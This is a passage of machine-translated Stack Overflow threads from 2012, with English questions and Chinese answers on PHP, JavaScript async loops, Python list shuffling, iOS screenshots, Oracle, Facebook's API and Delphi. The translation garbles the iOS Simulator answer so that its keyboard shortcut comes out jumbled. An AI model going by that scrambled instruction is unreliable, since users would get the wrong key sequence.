`$new_string`输出应该是：`New York New Jersey Computer Repair Tech`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:03:17.880

```
 $new_string = "";  

 foreach($phrases as $p) {

      $pos = stripos($string, $p);
      if ($pos !== false) {
         $new_string .= " ".$p;
       }
 }
 $new_string = trim($new_string);  // to remove additional space at the beginnig

echo $new_string; 
```

请注意，您的查找将不区分大小写，如果您想要区分大小写的搜索，请使用`strpos()` 而不是`stripos`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T12:05:00.543

您需要使用 stripos（为了获得最佳效率）：[http](http://php.net/manual/en/function.stripos.php) ://php.net/manual/en/function.stripos.php 。您的代码将类似于以下内容：

```
$matches = array();
foreach($phrases as $phrase) {
    if(stripos($string,$phrase) !== false){
        $matches[] = $phrase;
    }
}

$new_string = implode(" ",$matches); 
```

与 Davo 的答案条一样，将为您提供不区分大小写的搜索

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-12T12:21:00.863

试试这个功能

```
$phrases = array("New York", "New Jersey", "South Dakota", "South Carolina", "Computer Repair Tech");
$string = ("I live in New York, but used to live in New Jersey working as a computer repair tech.");

$matches = stringSearch($phrases, $string);

var_dump($matches);

function stringSearch($phrases, $string){
    $phrases1 = trim(implode('|', $phrases));
    $phrases1 = str_replace(' ', '\s', $phrases1);

    preg_match_all("/$phrases1/s", $string, $matches);

    return implode(' ', $matches[0]);
} 
```

# ios - Take iOS Simulator screenshots including device frame?

> ID：13343332
> 
> 赞同：51
> 
> 时间：2012-11-12T11:59:42.990
> 
> 标签：ios, screenshot

I want to [take screenshots](https://stackoverflow.com/questions/7092613/take-screenshots-in-the-ios-simulator?rq=1) of my iOS apps running from Xcode in the iPhone Simulator and iPad Simulator.

However, when I take screenshots, only the screen is captured. The device frame (which *is* shown on my desktop surrounding the iOS Simulator window) is not included in the screenshot.

How can I take screenshots of Xcode's iOS Simulator app and include the bounding hardware device frame?

* * *

## 回答 #1

> 赞同：82
> 
> 时间：2012-11-12T23:15:50.997

在模拟器中启动应用程序。然后按`Cmd`++ ，然后点击`Shift`模拟器，用模拟器框架截图。`4``space`

如果您在拍摄图像时按住 Option 键，它将保存屏幕截图，而边框周围没有阴影

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2012-11-12T12:30:20.090

在[AppStore 资源中心](http://developer.apple.com/appstore/resources/marketing/index.html)，您可以找到可用于宣传您的应用的 Apple 产品图片。还有一些关于如何正确使用资源的[指南。](https://developer.apple.com/appstore/AppStoreMarketingGuidelines.pdf)

更新：除了指南，一位朋友今天发现了一项完全符合您要求的服务： [PlaceIt](http://placeit.breezi.com/)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-12T12:07:56.897

如果您在 Xcode 中启动 iPhone 模拟器，您可以使用名为 Grab 的内置应用程序在 Mac 上捕获该窗口。输出为多种您喜欢的图形格式。

# android - Updating two layouts from one activity

> ID：13343335
> 
> 赞同：-1
> 
> 时间：2012-11-12T12:00:18.303
> 
> 标签：android

I'm trying to update two layouts at a time from one single activity class, but its crashing.

Here is what I'm doing:

User can interact with one layout and as soon a s user presses a button a popup comes, this popup is defines via another layout. So I neeed to update the popup layout every time, but while using the findViewById(), it is giving null and I cant modify the view.

What shall I do for this?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:09:53.167

**-**每次按下按钮时，您都需要`inflate`此弹出式布局。

**-**你需要那个充气`view.findViewById(......);`

**它将如下所示：**

```
lLay.setOnClickListener(new OnClickListener() {

@Override
public void onClick(View v) {
final Dialog exitDialog = new Dialog(ResetActivity.this,R.style.CustomDialogTheme_new);

v = View.inflate(getApplicationContext(),R.layout.spinnerlikedialog, null);
exitDialog.setContentView(v);

tClosing = (TableRow) v.findViewById(R.id.tableRow_ClosingDateDialog); 
```

# machine-learning - Multi-Criteria Optimization with Reinforcement Learning

> ID：13343336
> 
> 赞同：3
> 
> 时间：2012-11-12T12:00:19.163
> 
> 标签：machine-learning, power-management, reinforcement-learning

I am working on the power management of a system. The objectives that I am looking to minimize are power consumption and average latency. I have a single objective function having the linearly weighted sum of both the objectives:

```
C=w.P_avg+(1-w).L_avg,      where w belongs to (0,1) 
```

I am using Q-learning to find a pareto-optimal trade-off curve by varying the weight w and setting different preference to power consumption and average latency. I do obtain a pareto-optimal curve. My objective, now, is to provide a constraint (e.g., average latency L_avg) and thus tuning/finding the value of w to meet the given criteria. Mine is an online algorithm, so the tuning of w should take place in an online fashion.

Could I be provided any hint or suggestions in this regard?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-19T22:58:47.217

社区中有一个多目标强化学习分支。

想法是[1](http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.34.5216)：

> 为每个目标分配一组代理。将一个族中的智能体获得的解决方案与其他族中的智能体获得的解决方案进行比较。协商机制用于找到满足所有目标的折衷解决方案。

还有一篇你可能感兴趣的论文：

**基于强化学习的电力系统调度和电压稳定多目标优化[J]** .

不过，我没有找到它的公共网址。

# oracle - Object create not found error in oracle toad

> ID：13343338
> 
> 赞同：0
> 
> 时间：2012-11-12T12:00:28.550
> 
> 标签：oracle, stored-procedures, toad

I am creating procedure in oracle toad. When I run this procedure I am getting error like "object create not found. Am new to oracle.

```
procedure
---------
CREATE PROCEDURE CISCOCUIC.insrtCDRdet(rec integer)
IS   
 BEGIN
  insert into CISCOCUIC.CISCOCCDR_TBL(FLD_CDRRECORDTYPE)values(rec);
  COMMIT;
 END;
/ 
```

When I press alt+enter key am getting error object create not found

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:04:24.683

如果您具有在 CISCOCUIC 模式中创建过程的权限，请按如下方式创建您的过程。

```
CREATE OR REPLACE PROCEDURE CISCOCUIC.insrtcdrdet (rec INTEGER)
IS
BEGIN
    INSERT INTO CISCOCUIC.ciscoccdr_tbl (fld_cdrrecordtype)
      VALUES   (rec
                  );

    COMMIT;
END;
/ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T15:39:50.710

在 TOAD 中输入 alt 表示描述。如果您当时将光标放在 CREATE 上，它会给您该错误。相反，只需按 F9 即可运行该脚本。

# javascript - 在 JavaScript 的 for 循环中调用异步函数

> ID：13343340
> 
> 赞同：59
> 
> 时间：2012-11-12T12:00:46.867
> 
> 标签：javascript, asynchronous, for-loop, closures

我有以下代码：

```
for(var i = 0; i < list.length; i++){
    mc_cli.get(list[i], function(err, response) {
        do_something(i);
    });
} 
```

`mc_cli`是与 memcached 数据库的连接。可以想象，回调函数是异步的，因此它可能会在 for 循环结束时执行。此外，当以这种方式调用时，`do_something(i)`它总是使用 for 循环的最后一个值。

我尝试以这种方式关闭

```
do_something((function(x){return x})(i)) 
```

但显然这又总是使用 for 循环索引的最后一个值。

我还尝试在 for 循环之前声明一个函数，如下所示：

```
var create_closure = function(i) {
    return function() {
        return i;
    }
} 
```

然后打电话

```
do_something(create_closure(i)()) 
```

但同样没有成功，返回值始终是 for 循环的最后一个值。

谁能告诉我我在关闭时做错了什么？我以为我理解他们，但我不明白为什么这不起作用。

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2012-11-12T12:02:31.963

由于您正在运行一个数组，您可以简单地使用`forEach`which 提供列表项和回调中的索引。迭代将有自己的范围。

```
list.forEach(function(listItem, index){
  mc_cli.get(listItem, function(err, response) {
    do_something(index);
  });
}); 
```

* * *

## 回答 #2

> 赞同：46
> 
> 时间：2014-10-31T16:44:03.803

这是循环内的异步函数范例，我通常使用立即调用的匿名函数来处理它。这可确保使用索引变量的正确值调用异步函数。

好，太棒了。至此所有异步函数都已启动，循环退出。现在，由于它们的异步性质，或者它们将按什么顺序完成，这些函数何时完成尚无定论。如果你的代码需要等到所有这些函数都完成后再执行，我建议你简单地计算一下有多少函数已经完成：

```
var total = parsed_result.list.length;
var count = 0;

for(var i = 0; i < total; i++){
    (function(foo){
        mc_cli.get(parsed_result.list[foo], function(err, response) {
            do_something(foo);
            count++;
            if (count > total - 1) done();
        });
    }(i));
}

// You can guarantee that this function will not be called until ALL of the
// asynchronous functions have completed.
function done() {
    console.log('All data has been loaded :).');
} 
```

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2016-07-23T14:23:47.100

我知道这是一个旧线程，但无论如何添加我的答案。ES2015`let`具有在每次迭代时重新绑定循环变量的特性，所以它在异步回调中保持循环变量的值，所以你可以试试下面的一个：

```
for(let i = 0; i < list.length; i++){
    mc_cli.get(list[i], function(err, response) {
        do_something(i);
    });
} 
```

但无论如何，最好`forEach`使用立即调用函数或创建一个闭包，因为这`let`是 ES2015 的特性，并且可能不支持所有浏览器和实现。从[这里](https://kangax.github.io/compat-table/es6/)`Bindings ->let->for/for-in loop iteration scope`我可以看到它直到**Edge 13**甚至**Firefox 49**才被支持（我还没有检查这些浏览器）。它甚至说 Node 4 不支持它，但我亲自测试过，它似乎是受支持的。

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2012-11-12T12:07:55.337

你已经很接近了，但你应该将闭包传递给`get`而不是把它放在回调中：

```
function createCallback(i) {
    return function(){
        do_something(i);
    }
}

for(var i = 0; i < list.length; i++){
    mc_cli.get(list[i], createCallback(i));
} 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2018-01-24T07:05:57.930

试试这个，使用`async/await`语法和`Promise`

```
(async function() {
    for(var i = 0; i < list.length; i++){
        await new Promise(next => {
            mc_cli.get(list[i], function(err, response) {
                do_something(i); next()
            })
        })
    }
})() 
```

这将在每个循环中停止循环，直到`next()`函数被触发

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2018-07-17T14:51:05.813

ES2017：您可以将异步代码包装在一个函数中（比如 XHRPost），返回一个承诺（承诺中的异步代码）。

然后在 for 循环中调用函数（XHRPost），但使用神奇的 Await 关键字。:)

```
let http = new XMLHttpRequest();
let url = 'http://sumersin/forum.social.json';

function XHRpost(i) {
    return new Promise(function(resolve) {
        let params = 'id=nobot&%3Aoperation=social%3AcreateForumPost&subject=Demo' + i + '&message=Here%20is%20the%20Demo&_charset_=UTF-8';
        http.open('POST', url, true);
        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        http.onreadystatechange = function() {
                console.log("Done " + i + "<<<<>>>>>" + http.readyState);
                if(http.readyState == 4){
                    console.log('SUCCESS :',i);
                    resolve();
                }
        }
        http.send(params);       
   });
}

for (let i = 1; i < 5; i++) {
    await XHRpost(i);
   } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-01-23T14:02:28.007

如果您想在循环中运行异步函数，但仍想在执行回调后保留索引或其他变量，您可以将代码包装在 IIFE（立即调用函数表达式）中。

```
var arr = ['Hello', 'World', 'Javascript', 'Async', ':)'];
for( var i = 0; i < arr.length; i++) {
  (function(index){
    setTimeout(function(){
       console.log(arr[index]);
 }, 500); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-07-21T08:06:03.977

```
(async function() {
  for(var i = 1; i < category.length; i++){

   let result = await $.ajax({
        url: '{{ route('admin.loyalty-commission.sub-category') }}', // Url of the Route

        data: {id:category[i-1], cat_state:i, next_cat:category[i]},
        success: function (data) {
            console.log('ajax success previous category id' + category[i-1]);

            // Check if the logic was successful or not
            if (data.status == 'success') {

                $(data.subcategories).appendTo(sub_category); //ajax result append to sub_category
            } else {
                console.log(data.msg);
            }
        },
        error: function (data) {
            // Error while calling the controller (HTTP Response Code different as 200 OK
            console.log('Error:', data);
            success = false;
        }
    });
 }
})() 
```

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2021-01-04T10:16:44.127

这是我的应用程序中的示例代码。它可能有助于解决问题。我在地图循环中使用了异步/等待。多个承诺在一个数组中解决。

这帮助我解决了这个问题 [JavaScript async and await in loops](https://zellwk.com/blog/async-await-in-loops/)

```
 const refObjId= ['Account', 'Contact', 'Group'];

 const readdirPro = file => {
   return new Promise((resolve, reject) => {
    fs.readdir(file, (err, data) => {
      if (err) reject('I could not find the file');
      resolve(data);
    });
  });
};

const fileNamePromises = refObjId.map(async el => {
    const fileName = await readdirPro(`${__dirname}/../csv-files/${el}/data`);
    return fileName;
  });

//fileNamePromises is an array of promises

  const fileArr = await Promise.all(fileNamePromises);
    console.log(fileArr); 
```

* * *

## 回答 #10

> 赞同：-2
> 
> 时间：2018-05-11T11:59:53.173

使用 ES6 (typescript) 你可以使用`async`and的好处`await`：

```
let list: number[] = [1, 2, 3, 4, 5];

// this is async fucntion
function do_something(counter: number): Promise<number> {
    return new Promise((resolve, reject) => {
        setTimeout(() => {
            console.log('called after ' + counter + ' seconds');
            resolve(counter);
        }, counter * 1000);
    })
}
async function foo() {
    // itrate over list and wait for when everything is finished
    let data = await Promise.all(list.map(async i => await do_something(i)));

    console.log(data);
}

foo(); 
```

# ibm-mq - Setting Message property in rfhUtil

> ID：13343341
> 
> 赞同：1
> 
> 时间：2012-11-12T12:00:52.030
> 
> 标签：ibm-mq, websphere-7

I found in certain codes that given to me is message.getStringProperty(MESSAGE_TYPE)

but my question is where the property is set in rfhUtil tool

please guide me..

thanks in advance

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T13:39:30.590

您可以使用 RFHUTIL 的 MQMD 选项卡上的 MsgType 组合框设置消息类型。

# css - Multiple Code in a CSS Variable

> ID：13343346
> 
> 赞同：0
> 
> 时间：2012-11-12T12:01:09.333
> 
> 标签：css, variables

I think it's a easy question, but i found nothing in google which helps me.

I've the following code:

```
-moz-box-sizing: border-box;
-webkit-box-sizing: border-box;
box-sizing: border-box; 
```

Now i use it in more than 1 CSS class. And when i want to change the box-sizing, i don't want to change it in all statements. So i want to use some CSS variable. But i don't find a example to define more than one statement in a CSS variable. Any solution?

What i've already tried:

```
@boxsizing: 
(
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:05:27.840

Vanilla CSS 不会以您希望它们使用的方式使用变量。

对于这种行为，您需要其他工具来从动态代码文件中生成（有效的）CSS。示例包括以下内容：

*   [较少的](http://www.lesscss.de/)
*   [SASS](http://sass-lang.com/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T12:05:47.653

CSS 没有变量之类的东西。您可以通过为多个选择器定义相同的样式来使您的代码更加 DRY，例如：

```
.boxsizing, #my_element, div, a.foobar {
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T12:05:49.507

你需要像[SCSS](http://compass-style.org)这样的东西来做到这一点。

# python - randomizing two lists and maintaining order in python

> ID：13343347
> 
> 赞同：56
> 
> 时间：2012-11-12T12:01:09.427
> 
> 标签：python

Say I have two simple lists,

```
a = ['Spears', "Adele", "NDubz", "Nicole", "Cristina"]
b = [1,2,3,4,5]
len(a) == len(b) 
```

What I would like to do is randomize `a` and `b` but maintain the order. So, something like:

```
a = ["Adele", 'Spears', "Nicole", "Cristina", "NDubz"]
b = [2,1,4,5,3] 
```

I am aware that I can shuffle one list using:

```
import random
random.shuffle(a) 
```

But this just randomizes `a`, whereas, I would like to randomize `a`, and maintain the "randomized order" in list `b`.

Would appreciate any guidance on how this can be achieved.

* * *

## 回答 #1

> 赞同：89
> 
> 时间：2012-11-12T12:04:00.197

我会将这两个列表组合在一起，将结果列表打乱，然后拆分它们。这利用[`zip()`](http://docs.python.org/2/library/functions.html#zip)

```
a = ["Spears", "Adele", "NDubz", "Nicole", "Cristina"]
b = [1, 2, 3, 4, 5]

combined = list(zip(a, b))
random.shuffle(combined)

a[:], b[:] = zip(*combined) 
```

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2012-11-12T12:04:09.670

使用[`zip`](http://docs.python.org/2/library/functions.html?highlight=zip#zip)具有以“两种”方式工作的好功能。

```
import random

a = ['Spears', "Adele", "NDubz", "Nicole", "Cristina"]
b = [1,2,3,4,5]
z = zip(a, b)
# => [('Spears', 1), ('Adele', 2), ('NDubz', 3), ('Nicole', 4), ('Cristina', 5)]
random.shuffle(z)
a, b = zip(*z) 
```

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2018-05-14T12:13:43.883

为了避免重新发明*轮子，* 请使用 sklearn

```
from sklearn.utils import shuffle

a, b = shuffle(a, b) 
```

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2015-05-18T02:46:55.447

请注意，蒂姆的答案仅适用于 Python 2，不适用于 Python 3。如果使用 Python 3，您需要执行以下操作：

```
combined = list(zip(a, b))
random.shuffle(combined)
a[:], b[:] = zip(*combined) 
```

否则你会得到错误：

```
TypeError: object of type 'zip' has no len() 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2019-11-14T10:17:42.303

有一种更简单的方法可以避免压缩、复制和所有繁重的东西。我们可以分别对它们进行洗牌，但两次都使用相同的种子，这样可以保证洗牌的顺序是相同的。

```
import random as rd

A = list("abcde")
B = list(range(len(A)))
fixed_seed = rd.random()
rd.Random(fixed_seed).shuffle(A)
rd.Random(fixed_seed).shuffle(B) 
```

那么 A 和 B 是：

```
['e', 'a', 'c', 'b', 'd']
[ 4,   0,   2,   1,   3] 
```

更通用的版本，用于任意数量的列表：

```
def shuffle(*xss):
    seed = rd.random()
    for xs in xss:
        rd.Random(seed).shuffle(xs) 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-11-12T12:11:19.620

另一种方式可能是

```
a = ['Spears', "Adele", "NDubz", "Nicole", "Cristina"]
b = range(len(a)) # -> [0, 1, 2, 3, 4]
b_alternative = range(1, len(a) + 1) # -> [1, 2, 3, 4, 5]
random.shuffle(b)
a_shuffled = [a[i] for i in b] # or:
a_shuffled = [a[i - 1] for i in b_alternative] 
```

这是相反的方法，但仍然可以帮助您。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-01-27T16:36:55.643

这是我的风格：

```
import random
def shuffleTogether(A, B):
    if len(A) != len(B):
        raise Exception("Lengths don't match")
    indexes = range(len(A))
    random.shuffle(indexes)
    A_shuffled = [A[i] for i in indexes]    
    B_shuffled = [B[i] for i in indexes]
    return A_shuffled, B_shuffled

A = ['a', 'b', 'c', 'd']
B = ['1', '2', '3', '4']
A_shuffled, B_shuffled = shuffleTogether(A, B)
print A_shuffled
print B_shuffled 
```

# php - How to migrate Devise Rails Passwords to PHP

> ID：13343351
> 
> 赞同：1
> 
> 时间：2012-11-12T12:01:43.437
> 
> 标签：php, ruby-on-rails, authentication, devise, passwords

We are in the process of moving a website from Ruby to PHP. We already have a users table where the passwords were generated by Devise.

I am trying to find out how Devise stores the password in MySQL. Appears at first look to be a SHA encrypted with a salt, but I am not clear on how the salt is selected.

I am trying to work the Devise code back to pseudo code so that we can the re write the code in PHP. Looking for help or suggestions with this.

Trying to avoid resetting everybody's password, but depending on how well Devise stores passwords that might be the only option.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T23:11:01.907

设计使用 bcrypt 你应该问“我如何在 PHP 中使用 bcrypt”。这个问题已经被问过了：

[PHP 和 Bcrypt](https://stackoverflow.com/questions/7056154/php-and-bcrypt)

[PHP中的Ruby bcrypt密码检索](https://stackoverflow.com/questions/9321075/ruby-bcrypt-password-retrieval-in-php)

基本上，您应该将[crypt](http://php.net/manual/en/function.crypt.php)函数与河豚算法一起使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-15T03:12:01.257

也许您可以导出数据库并将其导入 PHP 数据库？

# facebook - Facebook 应用程序：fb 和 twitter 的份额按用户计算

> ID：13343355
> 
> 赞同：2
> 
> 时间：2012-11-12T12:01:47.380
> 
> 标签：facebook, facebook-graph-api, twitter

我正在创建一个 Facebook 应用程序，在这个应用程序中，用户可以从他们的 fb 画廊中选择照片或从他们的桌面上传，然后对它们进行一些图像处理。图像的视图将被更改。用户可以通过 facebook 和 twitter 分享图像。

我需要基于用户的共享图像的统计信息。

如果用表格来描述它，它看起来像这样：

**sid（共享ID）| uid(用户标识) | count(股数) | img（图像名称）| 链接（查看页面）**

我将按用户的位置对用户进行分组，并在谷歌地图中显示共享（fb、twitter）统计信息。

现在我可以通过链接（url）检测图像的共享总数。但我无法计算用户的份额。

在客户端可以检测到点击次数，但无法检测链接是否分享成功。

非常感谢任何帮助。

# facebook - 没有访问令牌的 Facebook 用户状态

> ID：13343362
> 
> 赞同：0
> 
> 时间：2012-11-12T12:02:46.410
> 
> 标签：facebook, facebook-graph-api

我知道我可以发出一个 html 获取请求来访问用户的基本信息。（例如：[https](https://graph.facebook.com/facebook) ://graph.facebook.com/facebook ）。但是，这不会显示用户的状态，即使它们是公开的。如果我在没有登录帐户的情况下访问[http://www.facebook.com/facebook ，我可以看到该用户的状态。](http://www.facebook.com/facebook)有没有办法使用 Graph API 获得这些？或者任何其他方式而无需登录或使用访问令牌？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:13:26.043

第一：那不是用户，那是一个页面。要阅读页面墙，您总是需要一个访问令牌。

> [https://developers.facebook.com/docs/reference/api/page/](https://developers.facebook.com/docs/reference/api/page/)

“任何有效的 access_token 或用户 access_token”。所以，一个应用程序访问令牌就足够了，不需要登录，但你肯定需要一个应用程序。以下是获取应用访问令牌的方法：

```
$app_access_token = APP_ID . '|' . APP_SECRET; 
```

# delphi - 获取作为通用参数传递的枚举大小和名称

> ID：13343363
> 
> 赞同：3
> 
> 时间：2012-11-12T12:02:46.927
> 
> 标签：delphi, generics, orm, enums

看看下面的代码：

```
uses
  TypInfo, Dialogs, Classes, Generics.Collections, ADODB, DB, SysUtils;

type
  TTable_1 = (ID, FName, LName, FatherName);

type
  TBaseTable<TableType> = class(TADOQuery)
  public
    constructor Create(AOwner: TComponent); Override;
    procedure Select(DS: TDataSource);
  end;

implementation

{ TBaseTable<TableType> }

constructor TBaseTable<TableType>.Create(AOwner: TComponent);
begin
  inherited;
  Self.Connection := DataModule3.ADOConnection1;
  Self.Connection.Connected := True;
end;

procedure TBaseTable<TableType>.Select(DS: TDataSource);
var
  Query: string;
  EnumIndex: Byte;
begin
  EnumIndex := 0;
  Query := 'SELECT ';
  while (GetEnumName(TypeInfo(TableType), EnumIndex) <> UnitName) do
  begin
    Query := Query + GetEnumName(TypeInfo(TableType), EnumIndex) + ',';
    Inc(EnumIndex);
  end;
  Query := Copy(Query, 0, Length(Query) - 1);
  Query := Query + ' FROM Table_1';
  Close;
  SQL.Text := Query;
  Open;
  DS.DataSet := Self;
end; 
```

我像这样使用它：

```
var
  Test: TBaseTable<TTable_1>;
begin
  Test := TBaseTable<TTable_1>.Create(Self);
  Test.Select(DataSource1);
end; 
```

如您所见，我将查询中的表名写为静态字符串（ 'Table_1' ），我想获取枚举名称并将其作为表名传递给 select 语句，以使代码更可用。

另一个问题是如何获取传递的枚举大小以获取字段名称，如您所见，目前我将当前枚举名称与单元名称进行比较，这是个坏主意，任何人都可以帮助我吗？

至少我想开发一个类，为我的数据库中的每个表编写一个枚举并将其传递给我的类，我的类的方法使用它来选择、插入、编辑等。

我想写一个微型 ORM 供我个人使用。

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T12:41:30.263

您可以使用新的 System.RTTI 单元：

```
function TBaseTable<TableType>.Select: string;
var
  EnumIndex: Byte;
  Context: TRttiContext;
  TableTypeRtti: TRttiEnumerationType;
begin
  Context := TRttiContext.Create;
  try
    TableTypeRtti := Context.GetType(TypeInfo(TableType)) as TRttiEnumerationType;
    Result := 'SELECT ';
    for EnumIndex := TableTypeRtti.MinValue to TableTypeRtti.MaxValue do begin
      Result := Result + GetEnumName(TypeInfo(TableType), EnumIndex) + ',';
    end;
    Result := Copy(Result, 0, Length(Result) - 1);
    Result := Result + ' FROM ' + TableTypeRtti.Name;
  finally
    Context.Free;
  end;
end; 
```

# ms-access - VB 2010 MS 访问日期时间

> ID：13343367
> 
> 赞同：-1
> 
> 时间：2012-11-12T12:03:02.527
> 
> 标签：ms-access

我使用 MS Access 作为我的数据库，使用 vb2010 作为前端。现在我没有在 date_recive 列中获得确切的日期时间值。我在 Access 表的设计视图中设置了自定义日期格式，并将默认值设置为 NOW()。保存记录但不是时间后，我在 db 中获得了正确的日期值。所以你能建议我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T13:36:07.243

*I neglected to read the part about VB 2010 this **code only applies to Access VBA***
If you want the save button click event to set the date time field you will need to set it with code. If your field was named dtmNow and was in the record source for this form, this code will set the field to the current date and time and save the record.

```
Me!dtmNow = Now()
DoCmd.RunCommand acCmdSaveRecord 
```

There may be a problem with this approach because this code will run no matter what you are changing. This will not reflect the date and time entered but the date and time last saved.

# c++ - C++ 和类对象名称

> ID：13343370
> 
> 赞同：0
> 
> 时间：2012-11-12T12:03:15.647
> 
> 标签：c++, class, variables, parameter-passing

当我有一个班级并且我正在制作这个班级的一个对象时，例如：

```
 class Sample{
    ...
    };

    int main(){ Sample object1; ...} 
```

对象的名称只是它的地址吗？当我以递归方式将类对象名称作为参数发送给函数时，我只是发送地址而不是将整个对象复制到内存中？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T12:04:44.267

名字不是地址而是名字。它存在于您的源代码和编译中，但根本不存在（有点）。它是一种语义构造，而不是内存中的值。

在您的 C++ 书籍中可以找到您在代码中使用其名称的对象所发生的事情的规则。通常，默认情况下会执行*副本*——以避免通过引用传递副本，或者传递指向对象的指针。

# mysql - MySQL在同一列上创建具有两个索引的表

> ID：13343375
> 
> 赞同：2
> 
> 时间：2012-11-12T12:03:36.923
> 
> 标签：mysql, indexing

是否可以在同一列上创建两个名称不同的索引？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:06:20.923

是的，你可以，但你为什么要这样做？

除非索引在某些方面有所不同，例如，如果有额外的列，或者索引中列的顺序不同，那么第二个重复索引将是多余的。

表上的每个附加索引都需要更多的磁盘存储空间（成本略有增加），也意味着在插入、更新或删除数据时需要写入更多数据（写入速度稍慢）。

但是是的，这是可能的，并且语法是人们所期望的，例如给定表格：

```
CREATE TABLE T1
(
  col1 INT,
  col2 INT
);

CREATE INDEX IX1 on T1(col1);
CREATE INDEX IX2 on T1(col1); 
```

SQL小提琴[在这里](http://sqlfiddle.com/#!9/7a12b2/1)

# c++ - 用于可视化图像数据的调试器

> ID：13343376
> 
> 赞同：4
> 
> 时间：2012-11-12T12:03:37.983
> 
> 标签：c++, c, debugging

是否有可以在调试会话期间可视化图像缓冲区的调试器（如果可能，免费）。就像是：

1.  我停在断点处。
2.  然后我选择一个图像缓冲区，给出数据的方向——RBG、CMYK、8bit、float等等。
3.  我看到了由数据制作的图像（或保存的图像）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:57:34.263

如果您正在使用 gdb 调试程序，您可以在到达断点后从 gdb 提示符调用您自己的（或其他一些库函数）来为您可视化图像缓冲区（可能在单独的窗口中）。

# php - 是否可以在 filter_var() 函数中添加用户定义的参数？

> ID：13343377
> 
> 赞同：2
> 
> 时间：2012-11-12T12:03:44.697
> 
> 标签：php

我正在使用带有 FILTER_CALLBACK 的“filter_var()”函数。
像这样的东西：

```
$value = filter_var($value, FILTER_CALLBACK, array('options' => 'my_func')); 
```

my_func() 通常接收 $value 作为参数：

```
function my_func($val)
{
    if (some cond)
    {
        return $val;
    }
    else
    {
        return false;
    }
} 
```

现在我想在外部作用域的 my_func() 中使用另一个 $var（我的意思是使用 filter_var()）。
一种选择是在函数中将其声明为全局。另一种是将它作为参数传递。
如何避免声明全局并将 $var 作为参数传递？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:06:12.837

```
function my_func($val,$val2=null)
{
    if (some cond)
    {
        return $val;
    }
    else
    {
        return false;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T13:02:03.110

如果您使用的是 PHP 5.3+，则可以使用闭包：

```
function my_func($val, $arg1, $arg2)
{
    return $arg1.': '.$val.' '.$arg2;
}

$testVar = 'test';
$result = filter_var($testVar, FILTER_CALLBACK, array('options' => function($var) {
    return my_func($var, 'someValue', 'someOtherValue');
}));

var_dump($result); // string(30) "someValue: test someOtherValue" 
```

当然，这个例子并没有真正“验证”任何东西，只是稍微改变了文本，但它应该让您了解它是如何工作的。

**编辑：**从评论来看，您希望对某些值使用某个函数，而不检查在每个循环中使用哪个函数。您是否考虑过使用[call_user_func](http://php.net/manual/en/function.call-user-func.php "call_user_func()")？这是一个例子：

```
function myFunc1($arg1, $arg2) { return 'Executed myFunc1 with arguments: '.$arg1.' '.$arg2; }
function myFunc2($arg1, $arg2) { return 'Executed myFunc2 with arguments: '.$arg1.' '.$arg2; }

$functionsToUse = array(
    'myFunc1',
    'myFunc2'
);

foreach ($functionsToUse as $func)
{
    echo call_user_func($func, 'value', 'another value').'<br>';
} 
```

# sql - 在 informix 中加入查询

> ID：13343380
> 
> 赞同：2
> 
> 时间：2012-11-12T12:03:56.567
> 
> 标签：sql, database, join, informix

我目前有 2 个查询（我从互联网上的各个页面获取）执行以下操作：

*   检索给定表的所有列
*   检索给定表的 PK 和 FK 约束

这些查询分别是

```
select 
    c.colname, 
    c.coltype, 
    c.collength
from 
    syscolumns c, 
    systables t
where 
    t.tabname = 'user' and 
    c.tabid = t.tabid 
```

和

```
select 
    c.colname, 
    c.colno, 
    o.constrtype 
from 
    systables t,
    sysconstraints o,
    sysindexes i,
    syscolumns c
where 
    t.tabname = 'user' and 
    c.tabid = t.tabid and
    o.tabid = t.tabid and 
    i.tabid = t.tabid and 
    o.constrtype in ('R', 'P') and 
    o.idxname = i.idxname and 
    (   colno = part1 or 
        colno = part2 or 
        colno = part3 or 
        colno = part4 or 
        colno = part5 or 
